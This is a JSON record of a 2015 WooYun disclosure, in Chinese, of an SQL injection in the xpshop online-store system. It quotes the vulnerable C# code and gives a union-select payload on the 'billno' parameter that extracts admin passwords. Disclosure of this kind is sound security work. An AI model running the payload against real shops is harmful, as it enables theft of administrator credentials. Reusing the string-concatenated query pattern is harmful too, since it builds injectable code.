{"id": 83711, "wybug_id": "wooyun-2015-0146964", "wybug_title": "xpshop网店系统sql注入再来一处", "wybug_corp": "xpshop", "wybug_author": "不能忍", "wybug_date": "2015-10-22 17:36", "wybug_open_date": "2015-12-06 17:38", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "11", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-22：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-12-06：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 应该还有几个就收工了，其实还有一些，不过感觉好累不想弄了。再挖多几个就收工了！ 详细说明：  漏洞位置xpshop.webui.IspOrderReturnBy：\nprotected void Page_Load(object sender, EventArgs e)\t\t{\t\t\tbase.Response.AddHeader(\"Pragma\", \"No-Cache\");\t\t\tbase.Response.Buffer = true;\t\t\tbase.Response.ExpiresAbsolute = DateTime.Now.AddSeconds(-1.0);\t\t\tbase.Response.Expires = 0;\t\t\tbase.Response.CacheControl = \"no-cache\";\t\t\tOrderDB orderDB = new OrderDB();\t\t\tint orderID = orderDB.GetOrderID(base.Request[\"billno\"].ToString());\t\t\tthis.order = orderDB.GetOrderDetails(orderID);\n跟进GetOrderID函数：\npublic int GetOrderID(string orderNo)\t\t{\t\t\treturn int.Parse(XpShopDB.ExecuteScalar(XpShopDB.ConnectionString, CommandType.Text, \"SELECT OrderID FROM Orders WHERE OrderNo = '\" + orderNo + \"'\", null).ToString());\t\t}\n都是一样没过滤直接进库的。payload:/isporderreturnby.aspx?billno=test' union select password from admin--   漏洞证明：  http://localhost/isporderreturnby.aspx?billno=test' union select password from admin--\n\n   修复方案：     版权声明：转载请注明来源 不能忍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}